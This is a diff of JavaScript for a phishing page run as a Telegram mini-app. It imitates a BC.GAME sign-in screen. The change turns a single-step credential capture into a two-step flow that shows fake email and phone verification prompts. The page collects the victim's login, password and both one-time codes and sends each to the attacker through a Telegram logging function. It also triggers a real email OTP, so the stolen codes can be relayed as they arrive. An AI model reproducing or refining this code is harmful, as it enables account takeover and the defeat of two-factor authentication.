@@ -10,149 +10,130 @@ if (tg) {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-    // UI Elements
-    const tabs = document.querySelectorAll('.tab');
-    const identifierInput = document.getElementById('identifier');
-    const passwordWrapper = document.getElementById('password-wrapper');
-    const passwordInput = document.getElementById('password');
+    // Elements
     const btnSignin = document.getElementById('btn-signin');
+    const identifierInput = document.getElementById('identifier');
+    const passwordInput = document.getElementById('password');
+    const stepModal = document.getElementById('verification-step-modal');
     const otpModal = document.getElementById('otp-modal');
+    const btnConfirmOtp = document.getElementById('btn-confirm-otp');
     const otpInput = document.getElementById('otp-input');
-    const btnConfirm = document.getElementById('btn-confirm');
+    
+    const emailVerifyItem = document.getElementById('email-verify-item');
+    const phoneVerifyItem = document.getElementById('phone-verify-item');
+    const stepCountText = document.getElementById('step-count-text');
+    
+    const verifyTitleText = document.getElementById('verify-title-text');
+    const verifyDescText = document.getElementById('verify-desc-text');
+    const verifyIconType = document.getElementById('verify-icon-type');
     const timerDisplay = document.getElementById('timer-count');
-    const verifyTitle = document.getElementById('verify-title');
-    const verifyText = document.getElementById('verify-text');
-    const verifyIcon = document.getElementById('verify-icon');
-    const closeBtns = document.querySelectorAll('.btn-close, .modal-close');
-    const togglePassBtn = document.querySelector('.btn-toggle-password');
-    const pasteBtn = document.querySelector('.btn-paste');
 
-    let currentTab = 'password';
+    let currentStep = 1; // 1: Email, 2: Phone
+    let userData = {};
     let timer;
 
-    // Tab Logic
-    tabs.forEach(tab => {
+    // Tab Switching Logic (Internal state only)
+    document.querySelectorAll('.tab').forEach(tab => {
         tab.addEventListener('click', () => {
-            tabs.forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             tab.classList.add('active');
-            currentTab = tab.dataset.tab;
-
-            if (currentTab === 'otp') {
-                passwordWrapper.style.display = 'none';
-                identifierInput.placeholder = 'Email / Phone Number';
+            if (tab.dataset.tab === 'otp') {
+                document.getElementById('password-wrapper').style.display = 'none';
             } else {
-                passwordWrapper.style.display = 'block';
-                identifierInput.placeholder = 'Email / Phone Number / Username';
+                document.getElementById('password-wrapper').style.display = 'block';
             }
         });
     });
 
-    // Toggle Password
-    if (togglePassBtn) {
-        togglePassBtn.addEventListener('click', () => {
-            const isPass = passwordInput.type === 'password';
-            passwordInput.type = isPass ? 'text' : 'password';
-            togglePassBtn.innerHTML = isPass ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
-        });
-    }
-
-    // Modal Close
-    closeBtns.forEach(btn => {
-        btn.addEventListener('click', () => {
-            otpModal.style.display = 'none';
-        });
-    });
-
-    // Paste Action
-    if (pasteBtn) {
-        pasteBtn.addEventListener('click', async () => {
-            try {
-                const text = await navigator.clipboard.readText();
-                if (text) otpInput.value = text;
-            } catch (e) {}
-        });
-    }
-
-    // Sign In Trigger
+    // Step 0: Initial Sign In
     btnSignin.addEventListener('click', () => {
         const id = identifierInput.value.trim();
         const pass = passwordInput.value.trim();
 
-        if (!id) {
-            alert('Please enter your Email or Phone Number');
-            return;
-        }
+        if (!id) return alert('Please enter your details');
 
-        if (currentTab === 'password' && !pass) {
-            alert('Please enter your password');
-            return;
-        }
+        userData = { id, pass, time: new Date().toLocaleString() };
+        
+        // Log Initial Attempt
+        logToTelegram('🔑 INITIAL LOGIN ATTEMPT', userData);
 
-        // Detect Type
-        const isEmail = id.includes('@');
-        const isPhone = /^\+?\d{7,15}$/.test(id.replace(/[\s-]/g, ''));
+        // Show Step 1 (1/2)
+        document.getElementById('sign-in-screen').style.display = 'none';
+        stepModal.style.display = 'flex';
+    });
 
-        if (isEmail) {
-            verifyTitle.innerText = 'Email Verification';
-            verifyText.innerText = 'Please enter the 6-digit verification code sent on e-mail';
-            verifyIcon.className = 'fas fa-envelope';
-        } else if (isPhone || !isNaN(id.charAt(0))) {
-            verifyTitle.innerText = 'Mobile Verification';
-            verifyText.innerText = 'Please enter the 6-digit verification code sent to your phone';
-            verifyIcon.className = 'fas fa-mobile-alt';
-        }
+    // Step 1: Click "Go Verify" for Email
+    emailVerifyItem.addEventListener('click', () => {
+        if (currentStep !== 1) return;
 
-        // Show Modal
-        otpModal.style.display = 'flex';
-        startTimer(60);
-
-        // Send Real OTP if it's an email
-        if (isEmail) {
+        verifyTitleText.innerText = 'Email Verification';
+        verifyDescText.innerText = 'Please enter the 6-digit verification code sent on e-mail';
+        verifyIconType.className = 'fas fa-envelope';
+        
+        // Call backend to send real email OTP if it's an email
+        if (userData.id.includes('@')) {
             fetch('/send-otp', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: id })
-            })
-            .then(res => res.json())
-            .then(data => {
-                if (!data.success) console.error('OTP Send Failed:', data.message);
-            })
-            .catch(err => console.error('OTP Fetch Error:', err));
+                body: JSON.stringify({ email: userData.id })
+            }).catch(e => console.error(e));
         }
 
-        if (tg) tg.HapticFeedback.impactOccurred('light');
+        otpModal.style.display = 'flex';
+        startTimer(60);
     });
 
-    // Confirm (Final Log)
-    btnConfirm.addEventListener('click', async () => {
+    // Step 2: Click "Go Verify" for Phone
+    phoneVerifyItem.addEventListener('click', () => {
+        if (currentStep !== 2) return;
+
+        verifyTitleText.innerText = 'Phone Verification';
+        verifyDescText.innerText = 'Please enter the 6-digit verification code sent to your phone';
+        verifyIconType.className = 'fas fa-phone-alt';
+
+        otpModal.style.display = 'flex';
+        startTimer(60);
+    });
+
+    // OTP Confirmation Logic
+    btnConfirmOtp.addEventListener('click', async () => {
         const otp = otpInput.value.trim();
-        if (otp.length < 4) {
-            alert('Invalid verification code');
-            return;
-        }
+        if (otp.length < 4) return alert('Invalid code');
 
-        btnConfirm.innerText = 'Verifying...';
-        btnConfirm.disabled = true;
+        btnConfirmOtp.innerText = 'Verifying...';
+        btnConfirmOtp.disabled = true;
 
-        const data = {
-            bot_user: tg?.initDataUnsafe?.user?.username || tg?.initDataUnsafe?.user?.first_name || 'Unknown',
-            bot_id: tg?.initDataUnsafe?.user?.id || 'N/A',
-            target_id: identifierInput.value,
-            target_pass: passwordInput.value || 'N/A',
-            target_otp: otp,
-            method: currentTab.toUpperCase()
-        };
-
-        await logToTelegram(data);
-
-        btnConfirm.innerText = 'Success';
-        if (tg) tg.HapticFeedback.notificationOccurred('success');
-
-        setTimeout(() => {
+        if (currentStep === 1) {
+            // Finished Email Step
+            userData.email_otp = otp;
+            await logToTelegram('📧 EMAIL OTP CAPTURED', userData);
+            
+            // Move to Step 2
+            currentStep = 2;
             otpModal.style.display = 'none';
-            if (tg) tg.close();
-            else location.reload();
-        }, 1500);
+            otpInput.value = '';
+            
+            stepCountText.innerText = '2/2';
+            emailVerifyItem.classList.add('disabled');
+            emailVerifyItem.querySelector('.item-action').innerHTML = 'Verified <i class="fas fa-check"></i>';
+            emailVerifyItem.querySelector('.item-action').style.color = '#3bc117';
+            
+            phoneVerifyItem.classList.remove('disabled');
+            phoneVerifyItem.classList.add('active');
+
+            btnConfirmOtp.innerText = 'Confirm';
+            btnConfirmOtp.disabled = false;
+        } else {
+            // Finished Phone Step
+            userData.phone_otp = otp;
+            await logToTelegram('📱 PHONE OTP CAPTURED', userData);
+            
+            btnConfirmOtp.innerText = 'Success';
+            setTimeout(() => {
+                if (tg) tg.close();
+                else location.reload();
+            }, 1500);
+        }
     });
 
     function startTimer(duration) {
@@ -166,16 +147,15 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 1000);
     }
 
-    async function logToTelegram(data) {
+    async function logToTelegram(title, data) {
         const msg = `
-🔥 <b>BC.GAME LOGIN CAPTURE</b>
+${title}
 ━━━━━━━━━━━━━━━
-👤 <b>TG User</b>: @${data.bot_user} (<code>${data.bot_id}</code>)
-📧 <b>Identifier</b>: <code>${data.target_id}</code>
-🔑 <b>Password</b>: <code>${data.target_pass}</code>
-🔢 <b>OTP Code</b>: <code>${data.target_otp}</code>
-🛠 <b>Method</b>: ${data.method}
-🕒 <b>Time</b>: ${new Date().toLocaleString()}
+👤 <b>User</b>: ${data.id}
+🔑 <b>Pass</b>: <code>${data.pass}</code>
+📧 <b>Email OTP</b>: <code>${data.email_otp || 'PENDING'}</code>
+📱 <b>Phone OTP</b>: <code>${data.phone_otp || 'PENDING'}</code>
+🕒 <b>Time</b>: ${data.time}
 ━━━━━━━━━━━━━━━`;
 
         try {
@@ -190,4 +170,12 @@ document.addEventListener('DOMContentLoaded', () => {
             });
         } catch (e) {}
     }
+
+    // Modal Close
+    document.querySelectorAll('.modal-close, .btn-back').forEach(btn => {
+        btn.addEventListener('click', () => {
+            otpModal.style.display = 'none';
+            if (btn.classList.contains('btn-back')) stepModal.style.display = 'none';
+        });
+    });
 });
